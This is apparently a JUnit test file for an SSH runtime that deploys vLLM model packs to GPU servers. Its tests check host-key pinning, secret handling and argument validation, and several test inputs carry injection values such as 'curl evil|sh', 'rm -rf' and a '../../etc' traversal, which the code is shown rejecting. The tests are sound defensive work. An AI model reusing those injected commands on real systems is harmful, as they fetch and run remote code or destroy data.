package com.stocktracker.packs;

import com.stocktracker.packs.runtime.CommandRunner;
import com.stocktracker.packs.runtime.RemoteRuntime;
import com.stocktracker.packs.runtime.SshCredentials;
import com.stocktracker.packs.runtime.SshRemoteRuntime;
import org.junit.jupiter.api.Test;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/** The SSH runtime against a recording CommandRunner, plus the real bootstrap script run locally for validation paths. */
class SshRemoteRuntimeTest {

    static final String SHA = "0123456789abcdef0123456789abcdef01234567";
    static final SshCredentials CREDS = new SshCredentials("gpu.example.com", 2222, "ubuntu",
            "[gpu.example.com]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample", "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----");

    static final class Recording implements CommandRunner {
        final List<List<String>> argvs = new ArrayList<>();
        final List<String> stdins = new ArrayList<>();
        final List<String> keyFileContents = new ArrayList<>();
        Result next = new Result(0, "", "", false);

        @Override
        public Result run(List<String> argv, String stdin, Duration timeout) {
            argvs.add(argv);
            stdins.add(stdin);
            int i = argv.indexOf("-i");
            if (i >= 0) {
                try { keyFileContents.add(Files.readString(Path.of(argv.get(i + 1)))); } catch (Exception e) { keyFileContents.add("<missing>"); }
            }
            return next;
        }

        @Override
        public Process start(List<String> argv) {
            throw new UnsupportedOperationException();
        }
    }

    private RemoteRuntime.DeploySpec spec() {
        return new RemoteRuntime.DeploySpec(7, "Qwen/Qwen3-8B", SHA, 8000, "pack-7", "auto", 32768, "0.90", 1,
                "none", "hermes", false, "0.11.0", "hf_SECRETTOKEN1234567890abc", "ak-SECRETAPIKEY");
    }

    @Test
    void deployPinsHostKeyAndKeepsSecretsOutOfArgv() {
        Recording r = new Recording();
        r.next = new CommandRunner.Result(0, "ANANKE_PHASE=INSTALLING\nANANKE_STARTED=1\n", "", false);
        new SshRemoteRuntime(r, "ssh", 90).deploy(CREDS, spec());

        List<String> argv = r.argvs.get(0);
        String joined = String.join(" ", argv);
        assertThat(joined).contains("StrictHostKeyChecking=yes", "BatchMode=yes", "GlobalKnownHostsFile=/dev/null", "-p 2222");
        assertThat(joined).doesNotContain("hf_SECRET", "ak-SECRET", "PRIVATE KEY");
        assertThat(argv.get(argv.size() - 1)).isEqualTo(
                "bash -s -- deploy 7 Qwen/Qwen3-8B " + SHA + " 8000 pack-7 auto 32768 0.90 1 none hermes 0 0.11.0");
        // Secrets reach the remote only base64'd on stdin, ahead of the fixed script.
        String stdin = r.stdins.get(0);
        assertThat(stdin).doesNotContain("hf_SECRET").contains("ANANKE_HF_TOKEN_B64=", "ANANKE_API_KEY_B64=", "Ananke Packs — vLLM bootstrap");
        // The key file existed for the call, and is gone afterwards.
        assertThat(r.keyFileContents.get(0)).contains("BEGIN OPENSSH PRIVATE KEY");
        int i = argv.indexOf("-i");
        assertThat(new File(argv.get(i + 1))).doesNotExist();
    }

    @Test
    void refusesUnsafeArguments() {
        Recording r = new Recording();
        RemoteRuntime.DeploySpec bad = new RemoteRuntime.DeploySpec(7, "Qwen/Qwen3-8B; curl evil|sh", SHA, 8000, "pack-7", "auto",
                0, "0.90", 1, "none", "none", false, "0.11.0", null, "ak");
        assertThatThrownBy(() -> new SshRemoteRuntime(r, "ssh", 90).deploy(CREDS, bad)).isInstanceOf(PackException.class);
        assertThat(r.argvs).isEmpty();
    }

    @Test
    void mapsScriptAndSshFailures() {
        Recording r = new Recording();
        SshRemoteRuntime rt = new SshRemoteRuntime(r, "ssh", 90);
        r.next = new CommandRunner.Result(1, "ANANKE_ERROR=NO_GPU\nANANKE_ERROR_DETAIL=nvidia-smi not found\n", "", false);
        assertThatThrownBy(() -> rt.deploy(CREDS, spec()))
                .satisfies(e -> assertThat(((PackException) e).code()).isEqualTo(PackException.Code.NO_GPU));
        r.next = new CommandRunner.Result(255, "", "ubuntu@gpu: Permission denied (publickey).", false);
        assertThatThrownBy(() -> rt.probe(CREDS))
                .satisfies(e -> assertThat(((PackException) e).code()).isEqualTo(PackException.Code.SSH_AUTH));
        r.next = new CommandRunner.Result(255, "", "Host key verification failed.", false);
        assertThatThrownBy(() -> rt.probe(CREDS))
                .satisfies(e -> assertThat(((PackException) e).code()).isEqualTo(PackException.Code.SSH_HOSTKEY));
        r.next = new CommandRunner.Result(255, "", "ssh: connect to host gpu port 2222: Connection timed out", false);
        assertThatThrownBy(() -> rt.probe(CREDS))
                .satisfies(e -> assertThat(((PackException) e).code()).isEqualTo(PackException.Code.SSH_UNREACHABLE));
    }

    @Test
    void parsesProbe() {
        Recording r = new Recording();
        r.next = new CommandRunner.Result(0, """
                ANANKE_OS=Ubuntu 22.04.4 LTS
                ANANKE_PYTHON=3.10
                ANANKE_VENV=1
                ANANKE_DISK_FREE_GB=180
                ANANKE_GPU=NVIDIA A10G, 23028, 550.54
                """, "", false);
        RemoteRuntime.Probe p = new SshRemoteRuntime(r, "ssh", 90).probe(CREDS);
        assertThat(p.gpus()).hasSize(1);
        assertThat(p.gpus().get(0).memoryMiB()).isEqualTo(23028);
        assertThat(p.venv()).isTrue();
        assertThat(p.diskFreeGiB()).isEqualTo(180);
    }

    /** Runs the real bootstrap script locally (no SSH) to prove its own validation rejects bad input. */
    @Test
    void bootstrapScriptRevalidatesItsArguments() throws Exception {
        String script = new String(getClass().getClassLoader().getResourceAsStream("packs/vllm-bootstrap.sh").readAllBytes(), StandardCharsets.UTF_8);
        assertThat(runScript(script, "deploy", "7", "Qwen/Qwen3-8B", "main", "8000", "pack-7", "auto", "0", "0.90", "1", "none", "none", "0", "0.11.0"))
                .contains("ANANKE_ERROR=INVALID_INPUT").contains("bad revision");
        assertThat(runScript(script, "deploy", "7", "Qwen/Qwen3-8B", SHA, "8000", "pack-7", "auto", "0", "0.90", "1", "none", "rm -rf", "0", "0.11.0"))
                .contains("ANANKE_ERROR=INVALID_INPUT");
        assertThat(runScript(script, "status", "../../etc")).contains("ANANKE_ERROR=INVALID_INPUT");
        assertThat(runScript(script, "frobnicate")).contains("unknown action");
    }

    /** Regression: the GPU line's character filter once contained a reversed tr range and killed the probe. */
    @Test
    void bootstrapProbeReportsGpus() throws Exception {
        String script = new String(getClass().getClassLoader().getResourceAsStream("packs/vllm-bootstrap.sh").readAllBytes(), StandardCharsets.UTF_8);
        Path bin = Files.createTempDirectory("fakebin");
        Path smi = bin.resolve("nvidia-smi");
        Files.writeString(smi, "#!/bin/sh\necho 'NVIDIA A10G, 23028, 550.54'\n");
        smi.toFile().setExecutable(true);
        String out = runScript(script, Map.of("PATH", bin + ":" + System.getenv("PATH")), "probe");
        assertThat(out).contains("ANANKE_GPU=NVIDIA A10G, 23028, 550.54").doesNotContain("ANANKE_ERROR");
    }

    private static String runScript(String script, String... args) throws Exception {
        return runScript(script, Map.of(), args);
    }

    private static String runScript(String script, Map<String, String> env, String... args) throws Exception {
        List<String> argv = new ArrayList<>(List.of("bash", "-s", "--"));
        argv.addAll(List.of(args));
        Path home = Files.createTempDirectory("ananke-home");
        ProcessBuilder pb = new ProcessBuilder(argv).redirectErrorStream(true);
        pb.environment().put("HOME", home.toString());
        pb.environment().putAll(env);
        Process p = pb.start();
        p.getOutputStream().write(script.getBytes(StandardCharsets.UTF_8));
        p.getOutputStream().close();
        p.waitFor(20, TimeUnit.SECONDS);
        return new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    }
}
